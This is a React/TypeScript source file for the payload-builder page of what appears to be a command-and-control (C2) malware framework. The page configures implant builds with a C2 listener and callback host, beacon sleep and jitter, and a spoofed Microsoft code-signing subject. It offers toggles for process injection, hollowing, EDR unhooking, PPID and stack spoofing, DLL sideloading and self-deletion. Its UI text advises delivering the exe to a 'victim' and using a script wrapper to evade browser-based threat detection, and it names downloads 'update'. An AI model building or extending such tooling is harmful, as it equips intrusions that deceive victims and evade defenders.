import { useState } from 'react'
import { Link } from 'react-router-dom'
import { useQuery, useQueryClient, useMutation } from '@tanstack/react-query'
import { api } from '../api/client'

interface Campaign { id: string; name: string }
interface Listener { id: string; name: string; bind_host: string; bind_port: number; callback_host?: string; type: string }

const LISTENER_INIT = { name: '', bind_host: '0.0.0.0', bind_port: 4443, callback_host: '', type: 'https' }
interface Build {
  id:            string
  campaign_id?:  string
  status:        'queued' | 'building' | 'complete' | 'failed'
  target_os:     string
  target_arch:   string
  artifact_url?: string
  sha256?:       string
  created_at:    string
  completed_at?: string
}

const STATUS_COLOR: Record<string, string> = {
  queued:   'var(--dm-amber)',
  building: 'var(--dm-blue)',
  complete: 'var(--dm-accent)',
  failed:   'var(--dm-red)',
}

const FEATURE_GROUPS: { label: string; features: [string, string][] }[] = [
  {
    label: 'Process Injection',
    features: [
      ['inject-classic', 'Classic thread injection'],
      ['inject-apc',     'Early-bird APC injection'],
      ['inject-hollow',  'Process hollowing'],
      ['inject-hijack',  'Thread hijacking'],
      ['inject-stomp',   'Module stomping'],
    ],
  },
  {
    label: 'Evasion',
    features: [
      ['ppid-spoof',   'PPID spoofing'],
      ['unhook',       'ntdll unhooking'],
      ['heap-encrypt', 'Heap sleep masking'],
      ['stack-spoof',  'Stack spoofing'],
    ],
  },
  {
    label: 'Loader / Lifecycle',
    features: [
      ['udrl',           'Reflective loader (UDRL)'],
      ['process-hollow', 'Hollow into trusted process (requires udrl)'],
      ['staged-payload', 'Staged payload (requires udrl)'],
      ['dll-sideload',   'DLL sideloading — compiles as version.dll for signed-EXE bundle'],
      ['self-delete',    'Agent self-delete on cleanup'],
    ],
  },
]

const INITIAL = {
  campaign_id:     '',
  listener_id:     '',
  target_os:       'windows',
  target_arch:     'x64',
  sleep_seconds:   30,
  jitter_pct:      20,
  ephemeral:       true,
  tls_skip_verify: true,
  sign_subject:    '',
  features:        [] as string[],
}
type FormState = typeof INITIAL

export function BuildPage() {
  const [form, setForm]               = useState<FormState>(INITIAL)
  const [building, setBuilding]       = useState(false)
  const [lastBuildId, setLastBuildId] = useState('')
  const [error, setError]             = useState('')
  const [showNewListener, setShowNewListener] = useState(false)
  const [listenerForm, setListenerForm]       = useState(LISTENER_INIT)
  const [listenerError, setListenerError]     = useState('')
  const qc = useQueryClient()

  const createListener = useMutation({
    mutationFn: (data: typeof LISTENER_INIT) => api.post('/api/v1/listeners', data).then(r => r.data),
    onSuccess: (created: Listener) => {
      void qc.invalidateQueries({ queryKey: ['listeners'] })
      setForm(f => ({ ...f, listener_id: created.id }))
      setShowNewListener(false)
      setListenerForm(LISTENER_INIT)
      setListenerError('')
    },
    onError: (err: unknown) => {
      const msg = (err as { response?: { data?: { error?: string } } })?.response?.data?.error
      setListenerError(msg ?? 'Create listener failed')
    },
  })

  const { data: campaigns = [] } = useQuery<Campaign[]>({
    queryKey: ['campaigns'],
    queryFn:  () => api.get('/api/v1/campaigns?active_only=true').then(r => r.data),
  })
  const { data: listeners = [] } = useQuery<Listener[]>({
    queryKey: ['listeners'],
    queryFn:  () => api.get('/api/v1/listeners').then(r => r.data),
  })
  const { data: builds = [] } = useQuery<Build[]>({
    queryKey:        ['builds'],
    queryFn:         () => api.get('/api/v1/builds').then(r => r.data),
    refetchInterval: 5_000,
  })

  const campaignMap = Object.fromEntries(campaigns.map(c => [c.id, c.name]))

  function toggleFeature(feat: string) {
    setForm(f => ({
      ...f,
      features: f.features.includes(feat)
        ? f.features.filter(x => x !== feat)
        : [...f.features, feat],
    }))
  }

  async function downloadWrap(buildId: string, format: 'hta' | 'ps1' | 'js') {
    try {
      const res = await api.get(`/api/v1/builds/${buildId}/deliver?format=${format}`, { responseType: 'blob' })
      const url = URL.createObjectURL(res.data)
      const a = document.createElement('a')
      a.href = url
      a.download = `update.${format}`
      a.click()
      URL.revokeObjectURL(url)
    } catch (err: unknown) {
      const data = (err as { response?: { data?: unknown } })?.response?.data
      if (data instanceof Blob) {
        try {
          const json = JSON.parse(await data.text())
          setError(json.error ?? `Failed to download ${format}`)
        } catch {
          setError(`Failed to download ${format}`)
        }
      } else {
        setError((data as { error?: string })?.error ?? `Failed to download ${format}`)
      }
    }
  }

  async function handleBuild(e: React.FormEvent) {
    e.preventDefault()
    setBuilding(true)
    setError('')
    setLastBuildId('')
    try {
      const { data } = await api.post<Build>('/api/v1/builds', { config: form })
      setLastBuildId(data.id)
      void qc.invalidateQueries({ queryKey: ['builds'] })
    } catch (err: unknown) {
      const msg = (err as { response?: { data?: { error?: string } } })?.response?.data?.error
      setError(msg ?? 'Build request failed')
    } finally {
      setBuilding(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ background: 'var(--dm-bg)' }}>

      {/* Header */}
      <div
        className="flex items-center gap-4 px-6 py-2.5"
        style={{ borderBottom: '1px solid var(--dm-border)', borderTop: '2px solid var(--dm-accent-lo)' }}
      >
        <Link
          to="/"
          style={{ color: 'var(--dm-text-lo)', fontSize: '0.72rem', textDecoration: 'none', transition: 'color 0.1s' }}
          onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-text-mid)')}
          onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-text-lo)')}
        >
          ← dashboard
        </Link>
        <span style={{ color: 'var(--dm-text-lo)' }}>|</span>
        <span style={{ color: 'var(--dm-text-hi)', fontWeight: 700, fontSize: '0.82rem', letterSpacing: '0.12em' }}>
          PAYLOAD BUILDER
        </span>
      </div>

      <div className="flex flex-col lg:flex-row gap-0 flex-1 min-h-0 overflow-auto">

        {/* ── Config panel ─────────────────────────────────── */}
        <div
          className="flex-shrink-0 overflow-y-auto"
          style={{ width: '100%', maxWidth: '420px', borderRight: '1px solid var(--dm-border)' }}
        >
          <form onSubmit={handleBuild}>
            {/* Notifications */}
            {(error || lastBuildId) && (
              <div style={{ padding: '0.75rem 1.25rem', borderBottom: '1px solid var(--dm-border)' }}>
                {error && (
                  <div style={{
                    color: 'var(--dm-red)',
                    background: 'var(--dm-red-bg)',
                    border: '1px solid rgba(255,58,76,0.25)',
                    padding: '0.45rem 0.7rem',
                    fontSize: '0.75rem',
                  }}>
                    ✕&nbsp;&nbsp;{error}
                  </div>
                )}
                {lastBuildId && (
                  <div style={{
                    color: 'var(--dm-accent)',
                    background: 'var(--dm-accent-bg)',
                    border: '1px solid rgba(0,212,176,0.2)',
                    padding: '0.45rem 0.7rem',
                    fontSize: '0.75rem',
                  }}>
                    ✓&nbsp;&nbsp;Build queued —&nbsp;
                    <span style={{ color: 'var(--dm-text-mid)', fontSize: '0.68rem' }}>{lastBuildId}</span>
                  </div>
                )}
              </div>
            )}

            {/* Target */}
            <div style={{ padding: '1rem 1.25rem', borderBottom: '1px solid var(--dm-border)' }}>
              <div className="dm-section mb-3">Target</div>
              <div className="space-y-3">
                <div>
                  <label className="dm-label">Campaign</label>
                  <select
                    className="dm-select"
                    value={form.campaign_id}
                    onChange={e => setForm(f => ({ ...f, campaign_id: e.target.value }))}
                  >
                    <option value="">Select campaign…</option>
                    {campaigns.map(c => <option key={c.id} value={c.id}>{c.name}</option>)}
                  </select>
                </div>
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="dm-label" style={{ marginBottom: 0 }}>Listener</label>
                    <button
                      type="button"
                      onClick={() => setShowNewListener(true)}
                      style={{
                        background: 'none', border: '1px solid var(--dm-border)',
                        color: 'var(--dm-accent-lo)', fontSize: '0.62rem',
                        letterSpacing: '0.1em', padding: '1px 6px', cursor: 'pointer',
                      }}
                    >
                      + new
                    </button>
                  </div>
                  <select
                    className="dm-select"
                    value={form.listener_id}
                    onChange={e => setForm(f => ({ ...f, listener_id: e.target.value }))}
                  >
                    <option value="">Select listener…</option>
                    {listeners.map(l => (
                      <option key={l.id} value={l.id}>
                        {l.name} — {l.type} {l.callback_host || l.bind_host}:{l.bind_port}
                      </option>
                    ))}
                  </select>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="dm-label">OS</label>
                    <select className="dm-select" value={form.target_os}
                      onChange={e => setForm(f => ({ ...f, target_os: e.target.value }))}>
                      <option value="windows">Windows</option>
                      <option value="linux">Linux</option>
                      <option value="macos">macOS</option>
                    </select>
                  </div>
                  <div>
                    <label className="dm-label">Arch</label>
                    <select className="dm-select" value={form.target_arch}
                      onChange={e => setForm(f => ({ ...f, target_arch: e.target.value }))}>
                      <option value="x64">x64</option>
                      <option value="x86">x86</option>
                      <option value="arm64">ARM64</option>
                    </select>
                  </div>
                </div>
              </div>
            </div>

            {/* Beacon */}
            <div style={{ padding: '1rem 1.25rem', borderBottom: '1px solid var(--dm-border)' }}>
              <div className="dm-section mb-3">Beacon</div>
              <div className="grid grid-cols-2 gap-3 mb-3">
                <div>
                  <label className="dm-label">Sleep (s)</label>
                  <input
                    type="number" min={1} max={3600}
                    className="dm-input"
                    value={form.sleep_seconds}
                    onChange={e => setForm(f => ({ ...f, sleep_seconds: +e.target.value }))}
                  />
                </div>
                <div>
                  <label className="dm-label">Jitter (%)</label>
                  <input
                    type="number" min={0} max={50}
                    className="dm-input"
                    value={form.jitter_pct}
                    onChange={e => setForm(f => ({ ...f, jitter_pct: +e.target.value }))}
                  />
                </div>
              </div>
              <div className="mb-3">
                <label className="dm-label">
                  Sign Subject&nbsp;
                  <span style={{ color: 'var(--dm-text-lo)', fontWeight: 400 }}>(leave blank = unsigned)</span>
                </label>
                <input
                  className="dm-input"
                  placeholder="CN=Microsoft Windows,O=Microsoft Corporation,C=US"
                  value={form.sign_subject}
                  onChange={e => setForm(f => ({ ...f, sign_subject: e.target.value }))}
                />
              </div>
              <div className="space-y-2">
                <label className="flex items-center gap-2.5 cursor-pointer select-none">
                  <input
                    type="checkbox"
                    checked={form.ephemeral}
                    onChange={() => setForm(f => ({ ...f, ephemeral: !f.ephemeral }))}
                    style={{ accentColor: 'var(--dm-accent-lo)', width: '13px', height: '13px', flexShrink: 0, cursor: 'pointer' }}
                  />
                  <span style={{ color: 'var(--dm-text-mid)', fontSize: '0.75rem' }}>Ephemeral (no persistence)</span>
                </label>
                <label className="flex items-center gap-2.5 cursor-pointer select-none">
                  <input
                    type="checkbox"
                    checked={form.tls_skip_verify}
                    onChange={() => setForm(f => ({ ...f, tls_skip_verify: !f.tls_skip_verify }))}
                    style={{ accentColor: 'var(--dm-amber)', width: '13px', height: '13px', flexShrink: 0, cursor: 'pointer' }}
                  />
                  <span style={{ color: form.tls_skip_verify ? 'var(--dm-amber)' : 'var(--dm-text-lo)', fontSize: '0.75rem' }}>
                    Skip TLS verify <span style={{ fontSize: '0.65rem', opacity: 0.7 }}>(dev/lab only)</span>
                  </span>
                </label>
              </div>
            </div>

            {/* Features */}
            {FEATURE_GROUPS.map(group => {
              const groupFeats = group.features.map(([f]) => f)
              const allChecked = groupFeats.every(f => form.features.includes(f))
              function toggleGroup() {
                setForm(prev => ({
                  ...prev,
                  features: allChecked
                    ? prev.features.filter(f => !groupFeats.includes(f))
                    : [...new Set([...prev.features, ...groupFeats])],
                }))
              }
              return (
                <div key={group.label} style={{ padding: '1rem 1.25rem', borderBottom: '1px solid var(--dm-border)' }}>
                  <div className="flex items-center justify-between mb-3">
                    <div className="dm-section">{group.label}</div>
                    <button
                      type="button"
                      onClick={toggleGroup}
                      style={{
                        background: 'none',
                        border: '1px solid var(--dm-border)',
                        color: allChecked ? 'var(--dm-text-lo)' : 'var(--dm-accent-lo)',
                        fontSize: '0.62rem',
                        letterSpacing: '0.1em',
                        padding: '2px 7px',
                        cursor: 'pointer',
                        textTransform: 'uppercase',
                      }}
                    >
                      {allChecked ? 'none' : 'all'}
                    </button>
                  </div>
                  <div className="space-y-2">
                    {group.features.map(([feat, desc]) => (
                      <label key={feat} className="flex items-start gap-2.5 cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={form.features.includes(feat)}
                          onChange={() => toggleFeature(feat)}
                          style={{ accentColor: 'var(--dm-accent-lo)', width: '13px', height: '13px', flexShrink: 0, marginTop: '2px', cursor: 'pointer' }}
                        />
                        <span>
                          <span style={{ color: 'var(--dm-accent-lo)', fontSize: '0.72rem', letterSpacing: '0.04em' }}>{feat}</span>
                          <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.72rem' }}>&nbsp;—&nbsp;{desc}</span>
                        </span>
                      </label>
                    ))}
                  </div>
                </div>
              )
            })}

            <div style={{ padding: '1rem 1.25rem' }}>
              <button
                type="submit"
                disabled={building}
                className="dm-btn"
              >
                {building ? '// building...' : 'Build Payload'}
              </button>
            </div>
          </form>
        </div>

        {/* ── Build history ─────────────────────────────────── */}
        <div className="flex-1 overflow-y-auto">
          <div style={{ padding: '1rem 1.5rem 0.5rem', borderBottom: '1px solid var(--dm-border)' }}>
            <div className="dm-section">Build History</div>
          </div>

          {builds.length === 0 ? (
            <p style={{ padding: '1.5rem', color: 'var(--dm-text-lo)', fontSize: '0.78rem' }}>
              No builds yet.
            </p>
          ) : (
            <table className="w-full" style={{ borderCollapse: 'collapse' }}>
              <thead>
                <tr style={{ borderBottom: '1px solid var(--dm-border)' }}>
                  {['Status', 'Target', 'Campaign', 'Created', 'Artifact'].map(h => (
                    <th key={h} style={{
                      textAlign: 'left',
                      fontWeight: 400,
                      fontSize: '0.6rem',
                      letterSpacing: '0.15em',
                      textTransform: 'uppercase',
                      color: 'var(--dm-text-lo)',
                      padding: '0.6rem 1rem',
                    }}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {builds.map((b, i) => (
                  <tr
                    key={b.id}
                    style={{
                      borderTop: i > 0 ? '1px solid var(--dm-border)' : undefined,
                      background: b.id === lastBuildId ? 'var(--dm-accent-bg)' : undefined,
                    }}
                  >
                    <td style={{ padding: '0.6rem 1rem' }}>
                      <span style={{
                        color: STATUS_COLOR[b.status] ?? 'var(--dm-text-mid)',
                        fontSize: '0.68rem',
                        fontWeight: 600,
                        letterSpacing: '0.1em',
                      }}>
                        {b.status.toUpperCase()}
                      </span>
                    </td>
                    <td style={{ padding: '0.6rem 1rem', color: 'var(--dm-text-mid)', fontSize: '0.78rem' }}>
                      {b.target_os}/{b.target_arch}
                    </td>
                    <td style={{ padding: '0.6rem 1rem', color: 'var(--dm-text-lo)', fontSize: '0.75rem' }}>
                      {b.campaign_id ? (campaignMap[b.campaign_id] ?? '—') : '—'}
                    </td>
                    <td style={{ padding: '0.6rem 1rem', color: 'var(--dm-text-lo)', fontSize: '0.72rem', whiteSpace: 'nowrap' }}>
                      {new Date(b.created_at).toLocaleTimeString()}
                    </td>
                    <td style={{ padding: '0.6rem 1rem' }}>
                      {b.status === 'complete' && b.artifact_url && (
                        <div className="flex flex-col gap-1.5">
                          <div className="flex items-baseline gap-2">
                            <a
                              href={b.artifact_url}
                              style={{ color: 'var(--dm-blue)', fontSize: '0.72rem', textDecoration: 'none', transition: 'color 0.1s', flexShrink: 0 }}
                              onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-blue)')}
                            >
                              ↓ exe
                            </a>
                            <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
                              direct payload — use when victim runs it themselves (Explorer, USB, internal share)
                            </span>
                          </div>
                          <div className="flex items-baseline gap-2">
                            <button
                              type="button"
                              onClick={() => downloadWrap(b.id, 'js')}
                              style={{ background: 'none', border: 'none', padding: 0, cursor: 'pointer', color: 'var(--dm-amber)', fontSize: '0.72rem', transition: 'color 0.1s', flexShrink: 0 }}
                              onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-amber)')}
                            >
                              ↓ js
                            </button>
                            <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
                              wscript wrapper — use when browser is the delivery vector; breaks Chrome→exe parent chain that triggers ATD
                            </span>
                          </div>
                        </div>
                      )}
                      {b.status === 'failed' && (
                        <span style={{ color: 'var(--dm-red)', fontSize: '0.68rem' }}>failed</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>

      {/* ── New Listener modal ──────────────────────────────── */}
      {showNewListener && (
        <div
          style={{
            position: 'fixed', inset: 0, zIndex: 50,
            background: 'rgba(0,0,0,0.7)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
          }}
          onClick={e => { if (e.target === e.currentTarget) { setShowNewListener(false); setListenerError('') } }}
        >
          <div style={{
            background: 'var(--dm-surface)', border: '1px solid var(--dm-border)',
            padding: '1.5rem', width: '100%', maxWidth: '380px',
          }}>
            <div style={{ color: 'var(--dm-text-hi)', fontWeight: 700, fontSize: '0.82rem', letterSpacing: '0.12em', marginBottom: '1rem' }}>
              NEW LISTENER
            </div>
            {listenerError && (
              <div style={{ color: 'var(--dm-red)', fontSize: '0.72rem', marginBottom: '0.75rem' }}>
                ✕&nbsp;{listenerError}
              </div>
            )}
            <div className="space-y-3">
              <div>
                <label className="dm-label">Name</label>
                <input className="dm-input" value={listenerForm.name}
                  onChange={e => setListenerForm(f => ({ ...f, name: e.target.value }))} />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="dm-label">Bind Host</label>
                  <input className="dm-input" placeholder="0.0.0.0" value={listenerForm.bind_host}
                    onChange={e => setListenerForm(f => ({ ...f, bind_host: e.target.value }))} />
                </div>
                <div>
                  <label className="dm-label">Port</label>
                  <input className="dm-input" type="number" min={1} max={65535} value={listenerForm.bind_port}
                    onChange={e => setListenerForm(f => ({ ...f, bind_port: +e.target.value }))} />
                </div>
              </div>
              <div>
                <label className="dm-label">Callback Host <span style={{ color: 'var(--dm-text-lo)', fontWeight: 400 }}>(public IP / domain agents dial)</span></label>
                <input className="dm-input" placeholder="e.g. 1.2.3.4 or c2.example.com"
                  value={listenerForm.callback_host}
                  onChange={e => setListenerForm(f => ({ ...f, callback_host: e.target.value }))} />
              </div>
              <div>
                <label className="dm-label">Type</label>
                <select className="dm-select" value={listenerForm.type}
                  onChange={e => setListenerForm(f => ({ ...f, type: e.target.value }))}>
                  <option value="https">HTTPS</option>
                  <option value="http">HTTP</option>
                  <option value="tcp">TCP</option>
                  <option value="smb">SMB</option>
                </select>
              </div>
            </div>
            <div className="flex gap-3 mt-4">
              <button
                type="button"
                className="dm-btn"
                disabled={createListener.isPending || !listenerForm.name || !listenerForm.bind_host || !listenerForm.bind_port}
                onClick={() => createListener.mutate(listenerForm)}
              >
                {createListener.isPending ? '// creating...' : 'Create'}
              </button>
              <button
                type="button"
                onClick={() => { setShowNewListener(false); setListenerError('') }}
                style={{
                  background: 'none', border: '1px solid var(--dm-border)',
                  color: 'var(--dm-text-lo)', fontSize: '0.75rem',
                  padding: '0.45rem 0.9rem', cursor: 'pointer',
                }}
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
